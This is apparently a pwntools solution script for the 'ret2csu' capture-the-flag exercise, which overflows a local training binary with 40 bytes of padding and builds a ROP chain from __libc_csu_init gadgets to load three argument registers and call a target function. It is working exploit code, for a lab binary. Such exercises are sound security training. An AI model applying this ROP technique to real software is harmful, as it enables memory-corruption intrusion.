from pwn import *
from socket import *
from struct import *

elf = ELF('./ret2csu')
p = elf.process()

context.arch = 'amd64'
context.log_level = 'debug'

#csu_gadgets
pop_registers = p64(0x0040069a)
set_argument = p64(0x00400680)

#Initial ptr for r12
ptr = p64(0x600398)


payload = b'A'*40
#payload += p64(0x00000000004004e6) #ret
payload += pop_registers
payload += p64(0x0)
payload += p64(0x1)
payload += ptr
payload += p64(0xdeadbeefdeadbeef) #rdi
payload += p64(0xcafebabecafebabe) #rsi
payload += p64(0xd00df00dd00df00d) #rdx

payload += set_argument
payload += p64(0xf)
payload += p64(0xf)
payload += p64(0xf)
payload += p64(0xf)
payload += p64(0xf)
payload += p64(0xf)
payload += p64(0xf)

payload += p64(0x00000000004006a3)
payload += p64(0xdeadbeefdeadbeef)


payload += p64(0x0000000000400510)

p.recvuntil('>')
p.sendline(payload)

print(p.recvall())

